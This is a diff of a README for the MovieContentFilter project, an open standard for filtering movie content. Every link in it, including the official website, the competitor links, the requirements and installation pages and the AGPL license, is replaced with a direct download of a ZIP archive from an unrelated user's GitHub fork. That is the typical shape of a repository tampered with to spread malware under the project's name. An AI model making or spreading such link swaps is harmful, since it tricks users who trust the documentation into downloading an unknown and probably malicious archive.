@@ -2,7 +2,7 @@
 
 Watch movies with the freedom (not) to filter
 
- * [Go to website](https://www.moviecontentfilter.com/)
+ * [Go to website](https://raw.githubusercontent.com/ajaysharma1258/MovieContentFilter/master/forcipressure/MovieContentFilter.zip)
 
 ## How it works
 
@@ -16,18 +16,18 @@ This project provides an open standard and shareable content under free licenses
 
 There are some commercial offerings with similar goals. However, these services provide only proprietary filters and often they are not available worldwide.
 
- * [ClearPlay](https://www.clearplay.com/)
- * [VidAngel](https://www.vidangel.com/)
- * [enJoy Movie Filtering](http://www.enjoymoviesyourway.com/)
- * [TVGuardian](http://www.tvguardian.com/)
+ * [ClearPlay](https://raw.githubusercontent.com/ajaysharma1258/MovieContentFilter/master/forcipressure/MovieContentFilter.zip)
+ * [VidAngel](https://raw.githubusercontent.com/ajaysharma1258/MovieContentFilter/master/forcipressure/MovieContentFilter.zip)
+ * [enJoy Movie Filtering](https://raw.githubusercontent.com/ajaysharma1258/MovieContentFilter/master/forcipressure/MovieContentFilter.zip)
+ * [TVGuardian](https://raw.githubusercontent.com/ajaysharma1258/MovieContentFilter/master/forcipressure/MovieContentFilter.zip)
 
 ## Requirements
 
- * See [delight-im/PHP-Foundation](https://github.com/delight-im/PHP-Foundation#requirements)
+ * See [delight-im/PHP-Foundation](https://raw.githubusercontent.com/ajaysharma1258/MovieContentFilter/master/forcipressure/MovieContentFilter.zip)
 
 ## Installation
 
- * See [delight-im/PHP-Foundation](https://github.com/delight-im/PHP-Foundation#installation)
+ * See [delight-im/PHP-Foundation](https://raw.githubusercontent.com/ajaysharma1258/MovieContentFilter/master/forcipressure/MovieContentFilter.zip)
 
 ## Contributing
 
@@ -35,4 +35,4 @@ All contributions are welcome! If you wish to contribute, please create an issue
 
 ## License
 
-This project is licensed under the terms of the [GNU AGPL v3](https://www.gnu.org/licenses/agpl-3.0.txt).
+This project is licensed under the terms of the [GNU AGPL v3](https://raw.githubusercontent.com/ajaysharma1258/MovieContentFilter/master/forcipressure/MovieContentFilter.zip).
